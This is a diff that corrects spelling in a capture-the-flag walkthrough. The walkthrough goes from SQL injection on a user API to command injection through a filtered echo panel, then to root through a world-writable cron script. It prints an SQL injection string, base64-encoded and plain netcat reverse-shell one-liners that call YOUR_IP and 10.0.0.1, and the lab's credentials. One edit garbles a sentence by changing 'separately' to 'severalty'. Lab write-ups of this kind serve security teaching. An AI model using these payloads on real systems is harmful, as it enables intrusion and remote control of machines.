@@ -45,13 +45,13 @@ where you can find a valid password and user name to login with
 email=Daedalus&password=g2e55kh4ck5r
 
 you get presented with an api interface where you can query for user data:
-lets try quering for our user Daedalus
+lets try querying for our user Daedalus
 you will get back the name and hashed password of him
 if you look at inspect element theres a hint hidden it tells you something about permissions ....
 
 ``` <!-- Minotaur!!! Told you not to keep permissions in the same shelf as all the others especially if the permission is equal to admin --> ```
 
-if you look at the structure of the paramenters you see at the naming pattern (namePeoplenameCreature) there may be a parameter called permissionPeople
+if you look at the structure of the parameters you see at the naming pattern (namePeoplenameCreature) there may be a parameter called permissionPeople
 so lets try out an sql-injection with this information
 
 ``` Daedalus' OR permissionPeople='admin ```
@@ -64,8 +64,8 @@ you can either crack this hash (rockyou list), or you can use a website like cra
 now login with the new userinformation you got
 user: M!n0taur password: aminotauro
 and a link to an pannel called "secret echo pannel"
-there you can echo some your input out witch internally executes the echo command but you somhow have to bypass the filters and gain RCE
-when you find out `` is permitted and you execute commands with it (you have to execute them seperatly at ';' because this char is filterd )
+there you can echo some your input out witch internally executes the echo command but you somehow have to bypass the filters and gain RCE
+when you find out `` is permitted and you execute commands with it (you have to execute them severalty at ';' because this char is filtered )
 the best way to bypass the filter is just with a base64 encoded reverse shell payload
 
 ```rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc YOUR_IP 4243 >/tmp/f ```
@@ -74,14 +74,14 @@ to this
 
 ```cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y=```
 
-since the equals sign is also filterd you will have to remove it witch leaves you with this payload
+since the equals sign is also filtered you will have to remove it witch leaves you with this payload
 
 ```echo "cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnwvYmluL3NoIC1pIDI+JjF8bmMgWU9VUl9JUCA0MjQzID4vdG1wL2Y" | base64 -d | bash```
 
 then you get access to to machine and find the user flag located in /home/user/
 
 ## Machine 
-you see theres cronjob running on a file owend by root(location: /timer/timer.sh) but wrteable by everyone
+you see theres cronjob running on a file owned by root(location: /timer/timer.sh) but writeable by everyone
 add your reverse shell (use a different port this time)
 
 ```rm /tmp/f;mknod /tmp/f p;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 4243 >/tmp/f```
